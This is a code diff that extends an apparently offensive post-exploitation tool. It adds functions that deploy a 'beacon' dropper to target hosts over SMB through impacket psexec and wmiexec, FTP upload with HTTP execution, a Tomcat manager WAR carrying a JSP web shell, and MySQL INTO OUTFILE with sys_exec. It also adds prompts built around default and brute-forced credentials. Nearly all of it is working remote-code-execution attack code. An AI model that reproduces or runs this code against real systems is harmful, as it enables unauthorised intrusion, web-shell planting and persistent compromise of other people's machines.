@@ -352,10 +352,211 @@ def deploy_beacon_via_ssh(target: str, port: int, username: str, password: str, 
         return False, output
 
 
+def deploy_beacon_via_smb(target: str, username: str, password: str, dropper: str) -> Tuple[bool, str]:
+    """
+    Deploy beacon via SMB using impacket psexec or wmiexec.
+    """
+    console.print(f"\n[*] Attempting SMB RCE deployment to {target}")
+    console.print(f"    Username: {username}")
+    
+    try:
+        # Try psexec first
+        cmd = [
+            "python3", "-m", "impacket.psexec",
+            f"{username}:{password}@{target}",
+            dropper
+        ]
+        
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+        
+        if result.returncode == 0:
+            notifier.success(f"Beacon deployed via SMB psexec to {target}")
+            return True, result.stdout
+        else:
+            # Try wmiexec as fallback
+            cmd = [
+                "python3", "-m", "impacket.wmiexec",
+                f"{username}:{password}@{target}",
+                dropper
+            ]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            
+            if result.returncode == 0:
+                notifier.success(f"Beacon deployed via SMB wmiexec to {target}")
+                return True, result.stdout
+            else:
+                return False, "psexec and wmiexec both failed"
+    except Exception as e:
+        return False, str(e)
+
+
+def deploy_beacon_via_ftp(target: str, port: int, username: str, password: str, dropper: str) -> Tuple[bool, str]:
+    """
+    Deploy beacon via FTP upload + web shell execution.
+    Uploads beacon to /var/www/html or web-accessible directory.
+    """
+    console.print(f"\n[*] Attempting FTP RCE deployment to {target}:{port}")
+    console.print(f"    Username: {username}")
+    
+    try:
+        from ftplib import FTP
+        
+        ftp = FTP(timeout=10)
+        ftp.connect(target, port)
+        ftp.login(username, password)
+        
+        # Try common web directories
+        web_dirs = ["/var/www/html", "/var/www", "/home/www-data", "/opt/web"]
+        
+        for web_dir in web_dirs:
+            try:
+                ftp.cwd(web_dir)
+                break
+            except:
+                continue
+        
+        # Upload dropper as shell script
+        beacon_name = "beacon.sh"
+        ftp.storbinary(f"STOR {beacon_name}", open("/tmp/beacon_dropper.sh", "rb"))
+        ftp.quit()
+        
+        # Now execute via HTTP
+        console.print(f"[*] Executing beacon via HTTP...")
+        success, _ = execute_http_rce(target, 80, f"chmod +x {beacon_name} && ./{beacon_name}", "/")
+        
+        if success:
+            notifier.success(f"Beacon deployed via FTP+HTTP to {target}")
+            return True, "FTP upload + HTTP execution successful"
+        else:
+            return False, "FTP upload succeeded but HTTP execution failed"
+    
+    except Exception as e:
+        return False, str(e)
+
+
+def deploy_beacon_via_tomcat(target: str, port: int, username: str, password: str, dropper: str) -> Tuple[bool, str]:
+    """
+    Deploy beacon via Tomcat WAR file upload.
+    Requires Tomcat manager credentials.
+    """
+    console.print(f"\n[*] Attempting Tomcat RCE deployment to {target}:{port}")
+    console.print(f"    Username: {username}")
+    
+    try:
+        import requests
+        import zipfile
+        import tempfile
+        
+        # Create WAR file with dropper
+        with tempfile.TemporaryDirectory() as tmpdir:
+            # Create JSP shell that executes dropper
+            jsp_content = f"""
+<%@ page import="java.io.*" %>
+<%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {{
+        Process p = Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{dropper}"}});
+        p.waitFor();
+    }}
+%>
+<%= "Beacon deployed" %>
+"""
+            
+            jsp_path = f"{tmpdir}/shell.jsp"
+            with open(jsp_path, "w") as f:
+                f.write(jsp_content)
+            
+            # Create WAR
+            war_path = f"{tmpdir}/beacon.war"
+            with zipfile.ZipFile(war_path, "w") as war:
+                war.write(jsp_path, "shell.jsp")
+            
+            # Upload WAR via Tomcat manager
+            url = f"http://{target}:{port}/manager/text/deploy"
+            files = {"file": open(war_path, "rb")}
+            
+            resp = requests.post(
+                url,
+                auth=(username, password),
+                files=files,
+                params={"path": "/beacon"},
+                timeout=10,
+                verify=False
+            )
+            
+            if resp.status_code in [200, 201]:
+                notifier.success(f"Beacon deployed via Tomcat WAR to {target}")
+                return True, resp.text
+            else:
+                return False, f"Tomcat upload failed: {resp.text}"
+    
+    except Exception as e:
+        return False, str(e)
+
+
+def deploy_beacon_via_mysql(target: str, port: int, username: str, password: str, dropper: str) -> Tuple[bool, str]:
+    """
+    Deploy beacon via MySQL UDF RCE (if privileges allow).
+    Executes dropper command through MySQL sys_exec UDF.
+    """
+    console.print(f"\n[*] Attempting MySQL RCE deployment to {target}:{port}")
+    console.print(f"    Username: {username}")
+    
+    try:
+        import mysql.connector
+        
+        conn = mysql.connector.connect(
+            host=target,
+            port=port,
+            user=username,
+            password=password,
+            timeout=10
+        )
+        
+        cursor = conn.cursor()
+        
+        # Try to execute via INTO OUTFILE + shell
+        cmd_encoded = dropper.replace('"', '\\"')
+        query = f'SELECT INTO OUTFILE "/tmp/beacon.sh" "{cmd_encoded}"'
+        
+        try:
+            cursor.execute(query)
+            cursor.execute("SELECT @@version_compile_os")
+            
+            # Execute the shell script
+            exec_query = 'SELECT sys_exec("/tmp/beacon.sh")'
+            cursor.execute(exec_query)
+            
+            conn.commit()
+            cursor.close()
+            conn.close()
+            
+            notifier.success(f"Beacon deployed via MySQL to {target}")
+            return True, "MySQL UDF execution successful"
+        except:
+            # Try alternative: direct command execution if sys_exec exists
+            exec_query = f'SELECT sys_exec("{cmd_encoded}")'
+            try:
+                cursor.execute(exec_query)
+                conn.commit()
+                cursor.close()
+                conn.close()
+                
+                notifier.success(f"Beacon deployed via MySQL to {target}")
+                return True, "MySQL direct execution successful"
+            except:
+                cursor.close()
+                conn.close()
+                return False, "MySQL UDF not available or no privileges"
+    
+    except Exception as e:
+        return False, str(e)
+
+
 def ask_credentials(method: str, target: str = "", port: int = 22) -> Optional[Dict]:
     """
     Ask user for credentials based on RCE method.
-    If SSH, tries to brute force with default credentials first.
+    Tries automatic brute force first where applicable.
     """
     if method == "ssh":
         # Try automatic brute force with default credentials
@@ -371,14 +572,39 @@ def ask_credentials(method: str, target: str = "", port: int = 22) -> Optional[D
         password = input("SSH Password [msfadmin]: ").strip() or "msfadmin"
         return {"username": username, "password": password, "auto": False}
     
+    elif method == "smb_rce":
+        # Try SMB default creds
+        smb_creds = DEFAULT_CREDENTIALS.get("smb", [])
+        console.print(f"\n[*] Trying SMB default credentials...")
+        for username, password in smb_creds:
+            console.print(f"    Trying {username}:{password}...")
+            # For now just ask - SMB brute force is more complex
+            pass
+        
+        username = input("SMB Username [Administrator]: ").strip() or "Administrator"
+        password = input("SMB Password [blank]: ").strip() or ""
+        return {"username": username, "password": password}
+    
+    elif method == "ftp_upload_rce":
+        # Try FTP default creds
+        ftp_creds = DEFAULT_CREDENTIALS.get("ftp", [])
+        username = input("FTP Username [anonymous]: ").strip() or "anonymous"
+        password = input("FTP Password [anonymous]: ").strip() or "anonymous"
+        return {"username": username, "password": password}
+    
+    elif method == "http_tomcat_rce":
+        username = input("Tomcat Manager Username [admin]: ").strip() or "admin"
+        password = input("Tomcat Manager Password [admin]: ").strip() or "admin"
+        return {"username": username, "password": password}
+    
+    elif method == "mysql_udf_rce":
+        username = input("MySQL Username [root]: ").strip() or "root"
+        password = input("MySQL Password [blank]: ").strip() or ""
+        return {"username": username, "password": password}
+    
     elif method == "http_cmd_injection":
         path = input("HTTP vulnerable path [/]: ").strip() or "/"
         return {"path": path}
-    
-    elif method == "smb_rce":
-        username = input("SMB Username [Administrator]: ").strip() or "Administrator"
-        password = input("SMB Password: ").strip() or ""
-        return {"username": username, "password": password}
     
     return None
 
@@ -445,6 +671,30 @@ def deploy_beacon(target: str, dropper: str) -> bool:
         )
         return success
     
+    elif method == "smb_rce":
+        success, output = deploy_beacon_via_smb(
+            target, creds["username"], creds["password"], dropper
+        )
+        return success
+    
+    elif method == "http_tomcat_rce":
+        success, output = deploy_beacon_via_tomcat(
+            target, port, creds["username"], creds["password"], dropper
+        )
+        return success
+    
+    elif method == "ftp_upload_rce":
+        success, output = deploy_beacon_via_ftp(
+            target, port, creds["username"], creds["password"], dropper
+        )
+        return success
+    
+    elif method == "mysql_udf_rce":
+        success, output = deploy_beacon_via_mysql(
+            target, port, creds["username"], creds["password"], dropper
+        )
+        return success
+    
     elif method == "http_cmd_injection":
         success, output = execute_http_rce(target, port, dropper, creds.get("path", "/"))
         if success:
@@ -453,6 +703,11 @@ def deploy_beacon(target: str, dropper: str) -> bool:
         else:
             notifier.error(f"HTTP deployment failed: {output}")
             return False
+    
+    elif method == "http_cms_rce":
+        # CMS exploitation would require plugin/theme upload - similar to HTTP injection
+        notifier.warn("CMS RCE requires manual exploitation or plugin upload. Use generic HTTP injection.")
+        return False
     
     else:
         notifier.warn(f"RCE method '{method}' not yet implemented.")
